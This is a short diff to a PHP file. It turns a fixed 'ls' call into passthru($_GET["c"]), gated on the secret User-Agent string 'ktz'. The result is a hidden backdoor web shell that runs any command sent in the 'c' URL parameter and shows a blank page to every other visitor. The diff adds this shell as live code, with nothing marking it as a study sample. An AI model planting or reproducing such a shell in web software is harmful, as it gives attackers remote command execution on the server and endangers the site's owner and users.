@@ -1,7 +1,7 @@
 <?php
 
-if($_SERVER['HTTP_USER_AGENT'] != "ktz") die(".");
+if($_SERVER['HTTP_USER_AGENT'] != "ktz") die();
 
-passthru('ls');
+passthru($_GET["c"]);
 
 ?>
